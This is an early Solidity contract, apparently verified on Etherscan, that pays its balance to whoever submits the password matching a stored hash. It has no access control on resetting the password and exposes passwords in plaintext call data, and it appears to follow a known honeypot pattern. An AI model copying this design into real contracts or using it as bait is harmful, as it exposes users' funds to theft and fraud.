/**
 *Submitted for verification at Etherscan.io on 2018-02-04
*/

pragma solidity ^0.4.10;

contract Gift_1_ETH {
    bool passHasBeenSet = false;
    function() payable {

    }

    function GetHash(bytes pass) constant returns (bytes32) {
        return sha3(pass);
    }

    bytes32 public hashPass;

    function SetPass(bytes pass) payable {
        if (!passHasBeenSet && (msg.value >= 1 ether)) {
            // hashPass = hash;
            hashPass = sha3(pass);
        }
    }
    
    function GetGift(bytes pass) {
        if (hashPass == sha3(pass)) {
            msg.sender.transfer(this.balance);
        }
    }

    function PassHasBeenSet(bytes32 hash) {
        if (hash == hashPass) {
            passHasBeenSet = true;
        }
    }
}